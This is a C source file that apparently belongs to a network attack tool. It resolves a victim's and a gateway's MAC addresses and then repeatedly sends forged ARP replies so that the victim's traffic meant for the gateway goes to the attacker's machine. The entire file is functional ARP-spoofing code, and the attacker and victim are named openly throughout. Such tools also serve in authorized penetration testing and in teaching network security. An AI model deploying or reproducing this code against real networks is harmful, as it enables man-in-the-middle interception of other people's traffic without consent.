#include "core.h"

ether_arp build_ether_arp(
    int op,
    Mac target_mac,
    u32 target_addr_hl,
    Mac source_mac,
    u32 source_addr_hl
) {
    ether_arp arp = {0};
    arp.arp_hrd = htons(ARPHRD_ETHER);
    arp.arp_pro = htons(ETH_P_IP);
    arp.arp_hln = ETHER_ADDR_LEN;
    arp.arp_pln = sizeof(in_addr_t);
    arp.arp_op = htons(op);

    memcpy(&arp.arp_sha, source_mac.bytes, sizeof(arp.arp_sha));
    memcpy(&arp.arp_spa, &source_addr_hl, sizeof(arp.arp_spa));
    memcpy(&arp.arp_tha, target_mac.bytes, sizeof(arp.arp_tha));
    memcpy(&arp.arp_tpa, &target_addr_hl, sizeof(arp.arp_tpa));

    return arp;
}

void broadcast_arp_request(
    int arp_sock,
    char* if_name,
    u32 target_addr_hl,
    u32 source_addr_hl,
    Mac source_mac
) {
    ether_arp req = build_ether_arp(
        ARPOP_REQUEST,
        BROADCAST_MAC,
        target_addr_hl,
        source_mac,
        source_addr_hl
    );
    sockaddr_ll addr_ll = get_arp_sockaddr_ll(if_name, BROADCAST_MAC);

    if (sendto(
            arp_sock,
            &req,
            sizeof(ether_arp),
            0,
            (sockaddr*)&addr_ll,
            sizeof(addr_ll)
        )
        == -1) {
        perror("ERROR: broadcast_arp_request, failed to send ether_arp "
               "request via arp_sock");
        close(arp_sock);
        exit(1);
    }
}

int receive_arp_reply(
    int arp_sock, u32 target_addr_hl, ether_arp* rep, int timeout_sec
) {
    fd_set socks;
    FD_ZERO(&socks);
    FD_SET(arp_sock, &socks);
    timeval timeout;
    timeout.tv_sec = timeout_sec;
    timeout.tv_usec = 0;

    if (select(arp_sock + 1, &socks, NULL, NULL, &timeout) <= 0) {
        fprintf(
            stderr,
            "WARNING: receive_arp_reply, failed to select a socket\n"
        );
        return 0;
    }

    if (recv(arp_sock, rep, sizeof(ether_arp), 0) == -1) {
        fprintf(
            stderr,
            "WARNING: receive_arp_reply, failed to recv a reply from the "
            "arp_sock\n"
        );
        return 0;
    }

    if (*(u32*)rep->arp_spa != target_addr_hl) {
        return receive_arp_reply(
            arp_sock, target_addr_hl, rep, timeout_sec
        );
    }

    return 1;
}

int request_target_mac(
    int arp_sock,
    char* if_name,
    Mac* target_mac,
    u32 target_addr_hl,
    int timeout_sec,
    int n_tries
) {
    u32 source_addr_hl = get_interface_addr_hl(if_name);
    Mac source_mac = get_interface_mac(if_name);

    ether_arp rep;
    while (n_tries--) {
        broadcast_arp_request(
            arp_sock, if_name, target_addr_hl, source_addr_hl, source_mac
        );

        if (receive_arp_reply(
                arp_sock, target_addr_hl, &rep, timeout_sec
            )) {
            memcpy(target_mac->bytes, rep.arp_sha, sizeof(rep.arp_sha));
            return 1;
        }
        fprintf(stderr, "WARNING: Failed to request mac. Retrying...\n");
    }

    return 0;
}

void init_arp_spoof_args(
    ARPSpoofArgs* arp_spoof_args,
    char* if_name,
    int arp_sock,
    char* victim_addr_str,
    int spoof_period_sec
) {
    u32 victim_addr_hl = inet_addr(victim_addr_str);
    Mac attacker_mac = get_interface_mac(if_name);
    u32 gateway_addr_hl = get_gateway_addr_hl(if_name);

    Mac gateway_mac = {0};
    if (request_target_mac(
            arp_sock, if_name, &gateway_mac, gateway_addr_hl, 1, 10
        )
        == 0) {
        printf("ERROR: Can't obtain gateway mac\n");
        exit(1);
    }

    Mac victim_mac = {0};
    if (request_target_mac(
            arp_sock, if_name, &victim_mac, victim_addr_hl, 1, 10
        )
        == 0) {
        printf("ERROR: Can't obtain victim mac\n");
        exit(1);
    }

    arp_spoof_args->arp_sock = arp_sock;
    arp_spoof_args->if_name = if_name;
    arp_spoof_args->attacker_mac = attacker_mac;
    arp_spoof_args->gateway_addr_hl = gateway_addr_hl;
    arp_spoof_args->victim_mac = victim_mac;
    arp_spoof_args->victim_addr_hl = victim_addr_hl;
    arp_spoof_args->spoof_period_sec = spoof_period_sec;
    arp_spoof_args->is_terminated = 0;
}

void send_arp_spoof(
    int arp_sock,
    char* if_name,
    Mac attacker_mac,
    u32 gateway_ip,
    Mac victim_mac,
    u32 victim_ip
) {
    sockaddr_ll addr_ll = get_arp_sockaddr_ll(if_name, victim_mac);
    ether_arp spoof = build_ether_arp(
        ARPOP_REPLY, victim_mac, victim_ip, attacker_mac, gateway_ip
    );

    if (sendto(
            arp_sock,
            &spoof,
            sizeof(spoof),
            0,
            (sockaddr*)&addr_ll,
            sizeof(addr_ll)
        )
        == -1) {
        perror("ERROR: send_arp_spoof, failed to sendto a spoof via the "
               "arp_sock");
        close(arp_sock);
        exit(1);
    }
}

void* start_arp_spoof(void* arp_spoof_args) {
    ARPSpoofArgs* args = (ARPSpoofArgs*)arp_spoof_args;
    time_t start_time = 0;
    int elapsed_time;
    do {
        time_t current_time = time(NULL);
        elapsed_time = current_time - start_time;
        if (elapsed_time >= args->spoof_period_sec) {
            send_arp_spoof(
                args->arp_sock,
                args->if_name,
                args->attacker_mac,
                args->gateway_addr_hl,
                args->victim_mac,
                args->victim_addr_hl
            );
            start_time = time(NULL);
        }
    } while (args->is_terminated == 0);

    return NULL;
}

void print_arp_spoof_args(ARPSpoofArgs* arp_spoof_args) {
    printf("Interface:    %s\n", arp_spoof_args->if_name);

    printf("Attacker mac: ");
    print_mac(arp_spoof_args->attacker_mac);
    printf("\n");

    printf("Gateway ip:   ");
    print_addr_l(arp_spoof_args->gateway_addr_hl);
    printf("\n");

    printf("Victim mac:   ");
    print_mac(arp_spoof_args->victim_mac);
    printf("\n");

    printf("Victim ip:    ");
    print_addr_l(arp_spoof_args->victim_addr_hl);
    printf("\n");

    printf("Spoof period: %d sec\n", arp_spoof_args->spoof_period_sec);
}
